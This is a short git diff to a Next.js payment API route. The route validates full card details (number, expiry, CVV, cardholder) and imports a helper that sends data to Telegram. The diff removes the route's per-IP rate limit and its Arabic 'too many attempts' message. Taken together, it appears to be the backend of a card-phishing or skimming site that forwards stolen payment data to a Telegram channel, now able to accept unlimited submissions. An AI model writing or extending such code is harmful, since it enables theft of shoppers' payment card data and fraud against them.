@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from "next/server";
-import { rateLimit, sendToTelegram } from "../../lib/rateLimit";
+import { sendToTelegram } from "../../lib/rateLimit";
 
 function validate(body: Record<string, unknown>): string | null {
   const { cardNumber, expiry, cvv, cardHolder, items, total, installmentType } = body;
@@ -25,9 +25,6 @@ export async function POST(req: NextRequest) {
       if (geo.country) country = geo.country;
     }
   } catch {}
-  if (!rateLimit(ip, 3, 15 * 60 * 1000)) {
-    return NextResponse.json({ ok: false, error: "عدد محاولات كثيرة، انتظر قليلاً" }, { status: 429 });
-  }
 
   const body = await req.json();
   const err = validate(body);
